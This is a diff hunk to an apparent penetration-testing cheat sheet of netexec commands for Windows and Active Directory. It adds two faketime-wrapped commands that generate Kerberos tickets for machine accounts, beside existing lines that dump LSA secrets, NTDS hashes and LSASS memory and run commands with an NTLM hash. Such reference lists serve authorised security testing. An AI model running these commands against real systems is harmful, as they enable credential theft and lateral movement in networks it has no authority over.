@@ -1457,6 +1457,8 @@ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa                       
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds                                       # dump NTDS hashes
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy                                    # dump LSASS with lsassy module
 netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                                      # execute command with NTLM hash
+faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' -k --generate-tgt <CCACHE_NAME>    # generate TGT while offsetting local time
+faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<HOSTNAME>$' -p '<HOST_PASSWORD>' -k --generate-tgt <HOSTNAME>    # generate host machine-account TGT while offsetting local time
 
 # LDAP
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users                             # active AD users
